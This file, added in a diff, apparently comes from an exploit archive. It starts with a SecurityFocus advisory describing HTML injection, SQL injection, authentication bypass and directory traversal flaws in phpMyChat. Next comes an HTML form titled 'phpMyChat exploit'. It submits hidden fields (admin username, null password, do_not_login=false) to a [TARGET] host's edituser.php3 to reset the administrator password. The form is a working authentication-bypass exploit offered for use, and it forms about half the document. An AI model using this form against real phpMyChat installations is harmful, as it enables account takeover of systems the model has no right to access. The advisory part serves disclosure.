@@ -1,0 +1,39 @@
+source: http://www.securityfocus.com/bid/10556/info
+ 
+phpHeaven phpMyChat is reported prone to multiple vulnerabilities. The issues result from insufficient sanitization of user-supplied data and design flaws. The following specific issues can affect the application:
+ 
+phpMyChat is prone to a HTML injection vulnerability. The issue affects the 'input.php3' script. Due to a lack of sufficient sanitization of user-supplied data, this HTML Injection vulnerability may permit an attacker to inject malicious HTML or script code into the affected application. Users who are connected to this session would have the attacker supplied HTML code rendered in their browser in the context of the vulnerable site.
+ 
+phpMyChat is prone to multiple SQL injection vulnerabilities. Again the issues are due to a failure of the application to properly sanitize user-supplied input. The problem presents itself when SQL syntax is passed through the URI parameters of the 'usersL.php3' script. The offending parameters are used in SQL queries prior to proper sanitization.
+ 
+An authentication bypass vulnerability is reported to affect the phpMyChat authentication system. It is reported that by saving and modifying the phpMyChat authentication screen an attacker may potentially bypass the authentication system.
+ 
+Finally phpMyChat is reported to be prone to a file disclosure vulnerability. A user who is authenticated as a site administrator can exploit the issue. The vulnerability presents itself because directory traversal sequences are not correctly sanitized from user-supplied data. It is reported that an attacker may disclose a target file by including a relative path including directory traversal sequences to the target file as a value for a URI parameter passed to the 'admin.php3' script.
+
+<HTML>
+<HEAD>
+<TITLE>phpMyChat exploit</TITLE>
+</HEAD>
+<BODY>
+<FORM ACTION="http://[TARGET]/chat/edituser.php3" METHOD="GET" AUTOCOMPLETE="OFF" NAME="EditUsrForm">
+<INPUT type="hidden" name="FORM_SEND" value="1">
+<INPUT type="hidden" name="AUTH_USERNAME" value="admin">
+<INPUT type="hidden" name="AUTH_PASSWORD" value="null">
+<!-- INSERT -->
+<INPUT type="hidden" name="do_not_login" value="false">
+<!-- END INSERT -->
+<INPUT TYPE="hidden" NAME="L" VALUE="russian">
+<INPUT TYPE="text" NAME="U" VALUE="admin">NAME *<BR>
+<INPUT TYPE="text" NAME="PASSWORD" VALUE="hex_pass">NEW PASS *<BR>
+<INPUT TYPE="text" NAME="FIRSTNAME" VALUE="">FIRST NAME<BR>
+<INPUT TYPE="text" NAME="LASTNAME" VALUE="">LAST NAME<BR>
+<INPUT TYPE="radio" NAME="GENDER" VALUE="1" >male<BR>
+<INPUT TYPE="radio" NAME="GENDER" VALUE="2" >female<BR>
+<INPUT TYPE="text" NAME="COUNTRY" VALUE="">COUNTRY<BR>
+<INPUT TYPE="text" NAME="WEBSITE" VALUE="">WEBSITE<BR>
+<INPUT TYPE="text" NAME="EMAIL" VALUE="you@email.ru">
+<INPUT type="checkbox" name="SHOWEMAIL" value="1" >show e-mail in public information<BR>
+<INPUT TYPE="submit" NAME="submit_type" VALUE="Change">
+</FORM>
+</BODY>
+</HTML>
